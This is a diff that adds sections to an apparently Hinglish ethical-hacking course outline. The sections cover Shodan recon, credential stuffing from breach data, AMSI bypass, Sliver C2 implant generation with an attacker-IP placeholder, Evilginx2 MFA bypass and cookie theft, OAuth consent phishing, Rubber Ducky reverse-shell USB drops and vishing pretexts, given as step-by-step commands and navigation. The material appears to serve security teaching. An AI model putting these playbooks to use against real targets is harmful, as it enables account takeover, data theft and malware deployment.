@@ -760,6 +760,84 @@ Sections: 1 | Topics: 4 | Subtopics: 17 | CVEs: 0
 ==================================================================================
 
 
+# Section 6.1: Information Gathering - Advanced OSINT & Breach Data
+
+=====Section 6.1: Information Gathering - Advanced OSINT & Breach Data=====
+[Instructor is naye section mein sikhata hai ki kaise Maltego ke alawa Shodan se IoT devices track kiye jate hain aur past data breaches se passwords extract kiye jate hain credential stuffing attacks ke liye.]
+
+--6.1--Information Gathering - Advanced OSINT & Breach Data--
+Topic 1: Infrastructure OSINT via Shodan & theHarvester
+Subtopics: Shodan Search Engine, Exposed IoT Devices, Port Enumeration, theHarvester CLI, OSINT Framework
+
+[📊 SCOPE SIGNAL for Topic 1:
+
+* Depth Level: Deep
+* Coverage Angle: Both
+* Transcript mein content volume: [Modern Update Extension] Practical Demo
+* Key terms from transcript: Shodan, Internet of Things, default credentials, exposed ports, theHarvester, OSINT framework, passive recon
+* Exam Tips / Instructor Emphasis: Instructor emphasizes ki active scanning (Nmap) target ko alert kar sakti hai, isliye Shodan jaisi passive scanning use karni chahiye.
+* Instructor ne jo analogies/examples/demos use kiye: Target company ka domain theHarvester mein run karke subdomains aur emails nikalna, aur Shodan pe unka IP daal kar open webcams aur RDP ports dikhana.
+]
+
+🔑 KEYWORDS DUMP for Topic 1:
+[Shodan, OSINT, Open Source Intelligence, passive reconnaissance, theHarvester, subdomains, open ports, default passwords, IoT devices, webcams, RDP, OSINT framework, passive scan]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 1:
+
+* Phase(s): Reconnaissance / OSINT
+* Attack methodology context from transcript: Target network ko physically ya actively touch kiye bina third-party databases se weak infrastructure dhoondhna.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1:
+
+* Recon/Discovery Phase: Attacker target domain ko theHarvester pe scan karta hai. Jo IP/Subdomains milte hain, unhe Shodan mein search karta hai to find vulnerable or open services (like unauthenticated databases or RDP).
+* Exploitation/Weaponization Phase: (N/A)
+* Post-Exploitation/Reporting Phase: (N/A)
+* Additional context: None
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 1:
+
+* Tool Name: Shodan (Web Interface)
+* Navigation Steps: Go to shodan.io > Search bar > Type `hostname:"target.com"` or `port:"3389" org:"TargetName"` > Review exposed IPs and services.
+
+--6.1--Information Gathering - Advanced OSINT & Breach Data--
+Topic 2: Exploiting Data Breaches (Credential Stuffing)
+Subtopics: HaveIBeenPwned, DeHashed Data, Plaintext Leaks, Password Reuse, Credential Stuffing Attack
+
+[📊 SCOPE SIGNAL for Topic 2:
+
+* Depth Level: Moderate
+* Coverage Angle: Both
+* Transcript mein content volume: [Modern Update Extension] Concept + Web Demo
+* Key terms from transcript: data breach, HaveIBeenPwned, DeHashed, password reuse, credential stuffing, plaintext password, hash cracking
+* Exam Tips / Instructor Emphasis: "People are lazy; they reuse the same password everywhere." Instructor highlights ki password cracking se zyada aasan purane leaked passwords use karna hai.
+* Instructor ne jo analogies/examples/demos use kiye: DeHashed pe target ka email search karna aur LinkedIn ya MySpace ke purane breach se plaintext password nikal kar current corporate portal pe login attempt karna.
+]
+
+🔑 KEYWORDS DUMP for Topic 2:
+[data breach, HaveIBeenPwned, DeHashed, credential stuffing, password reuse, plaintext, leaked database, dark web, hashes, hashcat, corporate portal]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 2:
+
+* Phase(s): Reconnaissance / Initial Foothold
+* Attack methodology context from transcript: Social engineering ya malware deliver karne se pehle, direct leaked credentials use karke aasan entry lene ka try karna.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 2:
+
+* Recon/Discovery Phase: Attacker OSINT se gather kiye emails ko DeHashed / LeakCheck pe query karta hai.
+* Exploitation/Weaponization Phase: Attacker ko purane breaches se plaintext passwords ya hashes milte hain. Attacker un passwords ko current VPN ya Webmail pe try karta hai (Credential Stuffing).
+* Post-Exploitation/Reporting Phase: (N/A)
+* Additional context: None
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 2:
+
+* Tool Name: DeHashed (Web Interface)
+* Navigation Steps: Open DeHashed > Search email address > Unlock entry > View plaintext password from historical breach.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+==================================================================================
+
+
 # Section 7: Windows Malware
 
 
@@ -1606,6 +1684,82 @@ Topic 3: Chaining Payloads (LaZagne & Vlogger)
 
 📊 PHASE SUMMARY:
 Sections: 1 | Topics: 3 | Subtopics: 19 | CVEs: 0
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+==================================================================================
+
+# Section 10.1: Windows Malware - Modern EDR Evasion & Next-Gen C2
+
+=====Section 10.1: Windows Malware - Modern EDR Evasion & Next-Gen C2=====
+[Is updated section mein instructor batata hai ki modern Windows Defender / EDRs ko bypass karne ke liye AMSI bypass techniques aur compiled languages (Go/Rust/Nim) ka use kaise kiya jata hai, aur Sliver C2 framework ko introduce karta hai.]
+
+--10.1--Windows Malware - Modern EDR Evasion & Next-Gen C2--
+Topic 1: Bypassing AMSI & Compiled Payloads (Go/Rust)
+Subtopics: AMSI Architecture, In-Memory Scanning, AMSI Bypass Strings, Obfuscation, Go/Rust/Nim Payloads
+
+[📊 SCOPE SIGNAL for Topic 1:
+
+* Depth Level: Deep
+* Coverage Angle: Conceptual & Practical
+* Transcript mein content volume: [Modern Update Extension] Deep dive into AV evolution
+* Key terms from transcript: AMSI, Antimalware Scan Interface, memory scanning, Go language, Rust, Nim, compiled payloads, EDR, CrowdStrike, obfuscation
+* Exam Tips / Instructor Emphasis: Instructor strongly warns ki PowerShell backdoors (like Empire) ab turant catch ho jate hain AMSI ki wajah se. "You must learn to blind AMSI before executing your main script."
+* Instructor ne jo analogies/examples/demos use kiye: PowerShell prompt mein "Invoke-Mimikatz" type karke dikhaya ki kaise bina execute kiye hi AMSI usko block kar deta hai, fir ek AMSI bypass memory patch run karke wahi command dobara run ki.
+]
+
+🔑 KEYWORDS DUMP for Topic 1:
+[AMSI, Antimalware Scan Interface, memory reflection, EDR, Endpoint Detection and Response, Go payloads, Rust backdoors, Nim compiler, static signatures, heuristic scanning, AMSI patching, memory injection]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 1:
+
+* Phase(s): Weaponization / Evasion
+* Attack methodology context from transcript: Evasion phase ka next-level jahan script-based malware ki jagah in-memory patching aur modern compiled payloads ka use hota hai.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1:
+
+* Recon/Discovery Phase: (N/A)
+* Exploitation/Weaponization Phase: Attacker apne PowerShell stager se pehle ek 'AMSI bypass' code append karta hai jo Windows ki `amsi.dll` ko memory mein patch (corrupt) kar deta hai. Ya fir attacker Python/Bat ki jagah Golang ya Rust mein payload likhta hai jisko EDRs easily reverse engineer nahi kar paate.
+* Post-Exploitation/Reporting Phase: Payload executes silently bypassing Windows Defender/EDR.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 1:
+
+* Tool Name: Command Line / PowerShell
+* Navigation Steps: Open PowerShell > Paste AMSI bypass one-liner > Execute payload
+
+--10.1--Windows Malware - Modern EDR Evasion & Next-Gen C2--
+Topic 2: Introduction to Sliver C2 Framework
+Subtopics: Sliver Overview, Empire vs Sliver, Mutual TLS (mTLS), Beacons vs Sessions, Implant Generation
+
+[📊 SCOPE SIGNAL for Topic 2:
+
+* Depth Level: Deep
+* Coverage Angle: Practical only
+* Transcript mein content volume: [Modern Update Extension] Tool setup and execution
+* Key terms from transcript: Sliver C2, Golang, Empire alternative, mTLS, beaconing, session, implant, C2 infrastructure
+* Exam Tips / Instructor Emphasis: "Sliver is the modern replacement for Empire and Meterpreter." Instructor explains that Sliver generates custom Go binaries which are highly evasive.
+* Instructor ne jo analogies/examples/demos use kiye: Sliver server start karke ek mTLS beacon (implant) generate kiya, target pe run kiya, aur dikhaya ki kaise beacon har 60 seconds mein silent check-in karta hai continuous session ke mukable.
+]
+
+🔑 KEYWORDS DUMP for Topic 2:
+[Sliver C2, Golang, framework, mTLS, mutual TLS encryption, beacon, session, implant, obfuscation, jitter, C2 profile, Empire replacement, Meterpreter alternative]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 2:
+
+* Phase(s): Initial Foothold / C2 (Command & Control)
+* Attack methodology context from transcript: Establishing a modern, stealthy, and encrypted command and control channel that mimics legitimate HTTPS traffic.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 2:
+
+* Recon/Discovery Phase: (N/A)
+* Exploitation/Weaponization Phase: Attacker Sliver CLI mein `generate --mtls <IP>` run karke ek Go-based implant banata hai. Usme jitter (delay) add karta hai taaki network traffic robotic na lage.
+* Post-Exploitation/Reporting Phase: Target run karta hai, Sliver console mein ek 'Beacon' aata hai. Attacker task queue mein commands dalta hai, aur jab beacon wapas ping karta hai tab commands silently execute ho jate hain.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 2:
+
+* Tool Name: Sliver C2 (Terminal)
+* Navigation Steps: Run `sliver-server` > type `generate --http [Attacker_IP] --save /tmp/` > type `http` to start listener > type `beacons` to view connections.
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -2822,6 +2976,155 @@ Topic 10: BeEF Social Engineering: Fake Updates (Cross-OS)
 
 📊 PHASE SUMMARY:
 Sections: 1 | Topics: 10 | Subtopics: 46 | CVEs: 0
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+==================================================================================
+
+
+# Section 14.1: Advanced Delivery - Bypassing 2FA & Cloud Defenses
+
+=====Section 14.1: Advanced Delivery - Bypassing 2FA & Cloud Defenses=====
+[Is section mein attacker seekhta hai ki MFA/2FA wale targets ko kaise hack kiya jaye using Adversary-in-the-Middle (AitM) attacks, aur Microsoft 365 / Google Workspace ke against OAuth phishing kaise ki jaye.]
+
+--14.1--Advanced Delivery - Bypassing 2FA & Cloud Defenses--
+Topic 1: 2FA Bypass via Adversary-in-the-Middle (Evilginx2)
+Subtopics: AitM Concept, Reverse Proxy, Evilginx2 Framework, Phishlets, Session Cookies Stealing, Pass-the-Cookie Attack
+
+[📊 SCOPE SIGNAL for Topic 1:
+
+* Depth Level: Deep
+* Coverage Angle: Both
+* Transcript mein content volume: [Modern Update Extension] Theory + Heavy Practical Demo
+* Key terms from transcript: 2FA, MFA bypass, AitM, Adversary in the Middle, reverse proxy, Evilginx2, phishlets, session tokens, cookies, Pass-the-Cookie
+* Exam Tips / Instructor Emphasis: Instructor heavily emphasizes ki hum password capture karne pe focus nahi kar rahe, humara target "Session Cookie" hai. Cookie mil gayi matlab 2FA bypass ho gaya.
+* Instructor ne jo analogies/examples/demos use kiye: Evilginx2 server setup kiya, Office 365 ka 'phishlet' load kiya. Target login karta hai, OTP dalta hai, login success hota hai. Attacker intercept ki hui session cookie ko apne browser (EditThisCookie) mein import karke bina password/OTP ke victim ke O365 inbox mein enter kar jata hai.
+]
+
+🔑 KEYWORDS DUMP for Topic 1:
+[MFA bypass, 2FA bypass, AitM, Adversary-in-the-Middle, Reverse Proxy, Evilginx2, phishlets, session cookie, authentication token, JWT, EditThisCookie, Pass-the-Cookie, Office 365 phishing, lure URL]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 1:
+
+* Phase(s): Initial Foothold / Credential Harvesting
+* Attack methodology context from transcript: Modern credential harvesting jahan credentials se zyada authenticated session tokens ki value hoti hai to bypass Multi-Factor Authentication.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1:
+
+* Recon/Discovery Phase: Attacker domain spoofing ke liye typo-squatted domain kharidta hai (e.g., `micros0ft-login.com`).
+* Exploitation/Weaponization Phase: Attacker Evilginx2 setup karta hai aur reverse proxy chalu karta hai. Target ko phishing email bheja jata hai. Target link pe click karke real site jaisi proxy site pe login karta hai aur apna OTP/App approve karta hai.
+* Post-Exploitation/Reporting Phase: Evilginx2 target aur real server ke beech bridge banta hai. Jaise hi real server login approve karke Cookie return karta hai, Evilginx2 us cookie ko steal kar leta hai. Attacker us cookie ko apne browser mein inject karke account takeover (ATO) kar leta hai.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 1:
+
+* Tool Name: Evilginx2 & EditThisCookie
+* Navigation Steps: In Evilginx2: `phishlets enable o365` > `lures create o365` > Send Lure URL to target. In Attacker Browser: Open Target Site > Click EditThisCookie extension > Paste stolen cookie > Refresh page.
+
+--14.1--Advanced Delivery - Bypassing 2FA & Cloud Defenses--
+Topic 2: Cloud Social Engineering (Illicit Consent Grant / OAuth)
+Subtopics: OAuth 2.0 Concept, Malicious Enterprise Apps, Consent Phishing, Microsoft Graph API, Token Extraction
+
+[📊 SCOPE SIGNAL for Topic 2:
+
+* Depth Level: Deep
+* Coverage Angle: Conceptual & Practical
+* Transcript mein content volume: [Modern Update Extension] Explanation of cloud APIs and consent phishing
+* Key terms from transcript: OAuth phishing, Illicit Consent Grant, Enterprise App, permissions, Microsoft Graph, Read Mail, offline_access
+* Exam Tips / Instructor Emphasis: "You don't need their password, you just need them to click 'Accept'." Instructor warns that this bypasses all traditional endpoint security.
+* Instructor ne jo analogies/examples/demos use kiye: Azure portal pe ek fake app banayi "HR PDF Viewer". Victim ko link bheja. Victim ne click kiya toh Microsoft ka official prompt aaya "HR PDF Viewer wants to read your emails". Victim ne Accept kiya, aur attacker ko backend se Graph API ke through sab emails mil gaye.
+]
+
+🔑 KEYWORDS DUMP for Topic 2:
+[OAuth 2.0, Consent Phishing, Illicit Consent Grant, Microsoft Entra ID, Azure App Registration, Microsoft Graph API, Read.Mail, offline_access, refresh token, cloud apps, third-party apps]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 2:
+
+* Phase(s): Initial Foothold / Data Exfiltration
+* Attack methodology context from transcript: Exploiting cloud architecture trust boundaries by making the user explicitly grant permissions to a malicious application.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 2:
+
+* Recon/Discovery Phase: Identify if the target uses Google Workspace or M365.
+* Exploitation/Weaponization Phase: Attacker creates a malicious app in their own cloud tenant requesting high-privilege scopes (Read Emails, Access Files). An OAuth authorization link is sent to the target via email.
+* Post-Exploitation/Reporting Phase: Target clicks link, sees the *real* Microsoft/Google URL, feels safe, and clicks "Accept" or "Allow". Attacker receives an OAuth token and uses APIs to silently download the victim's emails/OneDrive files without ever triggering an anomalous login alert.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 2:
+
+* Tool Name: Azure Portal (for attacker)
+* Navigation Steps: Azure Active Directory > App Registrations > New Registration > API Permissions > Add Microsoft Graph (Mail.Read) > Certificates & Secrets > Generate URL.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Section 14.2: Physical Delivery Methods & Hardware Payloads
+
+=====Section 14.2: Physical Delivery Methods & Hardware Payloads=====
+[Instructor is section mein sikhata hai ki digital filters ko bypass karne ke liye physically target location par hardware devices kaise use kiye jate hain, aur phone calls/SMS ke through SE kaise hoti hai.]
+
+--14.2--Physical Delivery Methods & Hardware Payloads--
+Topic 1: Hardware Keystroke Injection (Hak5 Rubber Ducky)
+Subtopics: HID (Human Interface Device) Spoofing, Rubber Ducky Anatomy, DuckyScript Language, Payload Delivery via USB Drop
+
+[📊 SCOPE SIGNAL for Topic 1:
+
+* Depth Level: Deep
+* Coverage Angle: Both
+* Transcript mein content volume: [Modern Update Extension] Concept + Hardware Demo
+* Key terms from transcript: Hak5 Rubber Ducky, HID, Human Interface Device, keystroke injection, DuckyScript, USB drop attack, 3 seconds to root
+* Exam Tips / Instructor Emphasis: Instructor emphasize karta hai ki PC isko USB drive nahi, balki ek Keyboard manta hai, isliye Antivirus isko scan nahi karta, making it highly lethal.
+* Instructor ne jo analogies/examples/demos use kiye: Ek simple DuckyScript likhi (GUI r, cmd, enter, type reverse shell). Us script ko compile karke USB mein dala. Target unlocked Windows PC mein USB lagaya aur sirf 3 second mein apne aap terminal khul ke backdoor chal gaya.
+]
+
+🔑 KEYWORDS DUMP for Topic 1:
+[Hak5 Rubber Ducky, BadUSB, HID spoofing, Human Interface Device, DuckyScript, GUI r, DELAY, STRING, keystroke injection, payload compiler, USB drop attack, physical penetration testing, bypass AV]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 1:
+
+* Phase(s): Initial Foothold / Physical Delivery
+* Attack methodology context from transcript: Leveraging physical access and hardware trust models (computers implicitly trust keyboards) to rapidly deploy a payload.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1:
+
+* Recon/Discovery Phase: Attacker physical office visit karta hai ya parking lot identify karta hai.
+* Exploitation/Weaponization Phase: Attacker DuckyScript mein payload (Empire stager) embed karta hai aur payload.bin ko USB flash drive (Rubber Ducky) mein flash karta hai. USB pe "Payroll 2026.pdf" ka sticker lagakar parking mein drop kar deta hai.
+* Post-Exploitation/Reporting Phase: Curious employee USB ko apne laptop mein lagata hai. USB turant keyboard banke 1000 words/min ki speed se malicious commands type kar deta hai. Attacker ko Empire agent mil jata hai.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 1:
+
+* Tool Name: Text Editor & Hak5 Compiler
+* Navigation Steps: Write DuckyScript (e.g., `DELAY 1000`, `GUI r`, `STRING cmd.exe`) > Upload to Hak5 compiler > Save `inject.bin` to SD card > Insert into Rubber Ducky.
+
+--14.2--Physical Delivery Methods & Hardware Payloads--
+Topic 2: Voice Phishing & SMS Spoofing (Vishing & SMiShing)
+Subtopics: Vishing Scenarios, Caller ID Spoofing, SMiShing, Impersonating IT Support, Pretexting
+
+[📊 SCOPE SIGNAL for Topic 2:
+
+* Depth Level: Moderate
+* Coverage Angle: Conceptual
+* Transcript mein content volume: [Modern Update Extension] Social Engineering strategy breakdown
+* Key terms from transcript: Vishing, voice phishing, Caller ID spoofing, SMiShing, pretexting, IT helpdesk, urgency, authority
+* Exam Tips / Instructor Emphasis: "The human firewall is the weakest link." Instructor notes ki ek phone call pe log zyada jaldi trust karte hain bajaye kisi email ke.
+* Instructor ne jo analogies/examples/demos use kiye: Caller ID spoof karke internal "IT Helpdesk" ka number show karwana. Target ko call karke bolna ki "Aapka account compromise ho raha hai, hum ek SMS bhej rahe hain security link ka, please uspar login karke verify karein." (SMiShing).
+]
+
+🔑 KEYWORDS DUMP for Topic 2:
+[Vishing, Voice Phishing, Caller ID Spoofing, VOIP, SMiShing, SMS Phishing, Pretexting, Urgency, Authority, IT Helpdesk impersonation, OTP stealing, Human Firewall]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 2:
+
+* Phase(s): Delivery / Initial Foothold
+* Attack methodology context from transcript: Non-digital direct human interaction to bypass digital security controls and extract credentials or deploy payloads via mobile devices.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 2:
+
+* Recon/Discovery Phase: Attacker LinkedIn se employees aur unke managers/IT department ka data aur phone numbers nikalta hai.
+* Exploitation/Weaponization Phase: Attacker VOIP service use karke apna Caller ID spoof karta hai. Target ko call (Vishing) karta hai. Fake authority dikhakar ek SMS (SMiShing) push karta hai jisme Evilginx2 (AitM) ka link hota hai.
+* Post-Exploitation/Reporting Phase: Target ghabrahat (urgency) mein link pe click karke OTP de deta hai, leading to full account takeover.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 2:
+
+* Tool Name: (N/A)
+* Navigation Steps: (N/A)
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
